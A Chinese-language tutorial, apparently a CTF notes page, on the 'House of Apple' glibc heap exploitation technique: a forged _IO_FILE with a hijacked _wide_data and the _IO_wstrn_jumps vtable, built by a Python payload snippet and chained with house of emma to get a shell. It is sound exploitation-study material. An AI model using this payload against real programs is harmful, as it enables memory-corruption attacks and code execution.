# House of Apple

> 一直能够适用到libc2.35的house技术

## 0x00 前言

在高版本的Glibc中由于取消了hook的利用，控制程序流就离不开控制IO流：

- [house of pig](https://www.anquanke.com/post/id/242640) 劫持`IO_FILE`结构体，还需要劫持`tcache_perthread_struct`结构体或者能控制任意地址分配.
- [house of kiwi](https://www.anquanke.com/post/id/235598)  修改三个地方的值：`_IO_helper_jumps + 0xA0`和`_IO_helper_jumps + 0xA8`，另外还要劫持`_IO_file_jumps + 0x60`处的`_IO_file_sync`指针；
- [house of emma](https://www.anquanke.com/post/id/260614) 修改两个地方的值，一个是`tls`结构体的`point_guard`(或者想办法泄露出来)，另外需要伪造一个`IO_FILE`或替换`vtable`为`xxx_cookie_jumps`的地址。
- [house of banana](https://www.anquanke.com/post/id/222948) 需要一次`largebin attack`，但是其攻击的是`rtld_global`结构体，而不是`IO`流。

上述方法利用成功的前提均是已经泄露出`libc`地址和`heap`地址。house of Apple也不例外。

## 0x01 条件

1、程序从`main`函数返回或能调用`exit`函数
2、能泄露出`heap`地址和`libc`地址
3、能使用一次`largebin attack`（一次即可）

## 0x02 原理

使用`largebin attack`可以劫持`_IO_list_all`变量，将其替换为伪造的`IO_FILE`结构体，而在此时，我们其实仍可以继续利用某些`IO`流函数去修改其他地方的值。要想修改其他地方的值，就离不开`_IO_FILE`的一个成员`_wide_data`的利用。

我们在伪造`_IO_FILE`结构体的时候，伪造`_wide_data`变量，然后通过某些函数，比如`_IO_wstrn_overflow`就可以将已知地址空间上的某些值修改为一个已知值。

分析一下这个函数，首先将`fp`强转为`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base != snf->overflow_buf`是否成立（一般肯定是成立的），如果成立则会对`fp->_wide_data`的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr`和`_IO_read_end`赋值为`snf->overflow_buf`或者与该地址一定范围内偏移的值；最后对`fp->_wide_data`的`_IO_write_ptr`和`_IO_write_end`赋值。

也就是说，只要控制了`fp->_wide_data`，就可以控制从`fp->_wide_data`开始一定范围内的内存的值，也就等同于**任意地址写已知地址**。

换而言之，假如此时在堆上伪造一个`_IO_FILE`结构体并已知其地址为`A`，将`A + 0xd8`替换为`_IO_wstrn_jumps`地址，`A + 0xc0`设置为`B`，并设置其他成员以便能调用到`_IO_OVERFLOW`。`exit`函数则会一路调用到`_IO_wstrn_overflow`函数，并将`B`至`B + 0x38`的地址区域的内容都替换为`A + 0xf0`或者`A + 0x1f0`。

**伪造的IO_file结构体**

````python
# fake_io = p64(0xfbad1800) #flag
# fake_io += p64(0) #_IO_read_ptr
fake_io = p64(0) #_IO_read_end
fake_io += p64(0) #_IO_read_base
fake_io += p64(0) #_IO_write_base
fake_io += p64(1) #_IO_write_ptr  #write_ptr > write_base
fake_io += p64(0) #_IO_write_end
fake_io += p64(0) #_IO_buf_base
fake_io += p64(0) #_IO_buf_end
fake_io += p64(0) #_IO_save_base
fake_io += p64(0) #_IO_backup_base
fake_io += p64(0) #_IO_save_end
fake_io += p64(0) #_markers 
fake_io += p64(0) #_chain 
fake_io += p32(0) #_fileno 
fake_io += p32(8) #_flags2   #bypass _flag2&8 == 0
fake_io += p64(0) #_old_offset
fake_io += p64(0) #_vtable_offset
fake_io += p64(0) #_lock
fake_io += p64(0) #_offset
fake_io += p64(0) #_codecvt
fake_io += p64(heap_base+0x2760)  #_wide_data -> target
fake_io += p64(0) #_freeres_list
fake_io += p64(0) #_freeres_buf
fake_io += p64(0)*4 #__pad5
fake_io += p64(libc_base+0x1e1c60)  #vtable -> _IO_wstrn_jumps
````

这样的效果就是把``_wide_data``到``_wide_data+0x38``替换为已知堆地址，相当于实现了多次largebinAttack。

虽然感觉用处不是很大，但是这样做的好处是`_chian`也是可控的，可以布置IO链配合其他house的方法多次调用，例如配合house of emma ，用house of apple来修改pointer_guard，house of emma拿到shell。

## 0xFF 参考连接

[House of apple 一种新的glibc中IO攻击方法](https://bbs.pediy.com/thread-273418.htm)